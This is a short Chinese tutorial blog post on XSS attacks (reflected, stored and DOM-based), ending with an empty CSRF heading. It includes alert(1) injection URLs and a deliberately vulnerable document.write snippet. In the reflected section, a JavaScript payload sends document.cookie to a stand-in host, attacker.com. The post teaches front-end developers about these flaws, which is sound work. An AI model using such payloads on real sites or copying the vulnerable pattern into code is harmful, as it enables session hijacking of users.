---
title: xss和csrf
date: 2018-07-09 11:02:34
tags: 浏览器
---

# xss

> cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）

- 主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。

## 反射型

- 如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞
- 显著特征是应用程序没有进行任何过滤和净化措施

### 案例

- 如果一个网站的错误消息是这样显示的，www.xxx.com/error.php?message=sorry,an error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error occurred</p>，返回给用户
- www.xxx.com/error.php?message=<script>alert(1)</script>，当用户打开错误页面的时候，就会出现<p><script>alert(1)</script></p>，弹出一个消息框

- 当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。
- 截获用户的会话后，就可以访问该用户授权访问的所有数据和功能
- 比如攻击构造这样一个 url，message 信息如下

```javascript
let i = new Image();
i.src = "http://attacker.com?cookie=" + document.cookie;
```

- 由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 www.xxx.com 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。

## 保存型

- 脚本通常保存在后端数据库，不经过过滤就存储并且显示给用户
- 与反射性的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者访问含有恶意代码的数据，恶意代码执行
- 与反射型不同的是，保存型不需要一个专门设计的 url 来接受 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过也可以用保存型的漏洞来获取用户 cookie 劫持。
- 如果社交论坛存在保存型的 xss 漏洞，黑客将自己的个人信息一栏修改成恶意的 js 代码，该代码实现两个功能，首先受害者先加自己为好友，然后修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行恶意脚本，然后可怕的“蠕虫”就开始了

## 基于 dom 的 xss 漏洞

- 前两种 xss 漏洞，都表现为一种特殊的模式，就是应用程序提取数据并返回给受害者。而基于 dom 的 xss 不具有这种特点，攻击者是借助于 javascript 来展开攻击的

## 案例

```javascript
let url = document.location;
let message = /message=(.+)$/.exec(url)[1];
document.write(message);
// js脚本中这样写，如果攻击者给受害者发送www.xxx.com/error.php?message=<script>alert(1)</script>，也可以展开xss漏洞攻击
```

- 所以写 js 的前端同学注意了，万一写出了有漏洞的代码，这锅得自己背。

# csrf

> cross site request forgery 的缩写，即跨站脚本请求伪造
